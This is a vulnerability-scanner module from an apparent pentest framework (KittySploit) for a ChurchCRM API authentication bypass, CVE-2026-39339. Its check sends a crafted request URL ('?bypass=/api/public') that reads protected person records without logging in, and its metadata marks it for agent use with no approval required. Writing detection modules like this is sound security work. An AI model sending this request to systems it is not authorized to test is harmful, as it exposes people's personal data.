#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ChurchCRM < 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ChurchCRM - API Authentication Bypass via URL Injection Detection',
        'description': "ChurchCRM < 7.1.0 contains an authentication bypass caused by improper API middleware URL handling in ChurchCRM/Slim/Middleware/AuthMiddleware.php, letting unauthenticated attackers access protected API endpoints, exploit requires crafted request URL with 'api/public",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'churchcrm', 'auth-bypass'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/ChurchCRM/CRM/security/advisories/GHSA-v3p2-mx78-pxhc'],
        'cve': 'CVE-2026-39339',
    }

    def run(self):
        path = '/api/persons/latest?bypass=/api/public'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('PersonId', 'FormattedName', '"people"',)
        ctype_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='critical',
                reason='ChurchCRM - API Authentication Bypass via URL Injection detected',
                path=path,
            )
            return True
        return False

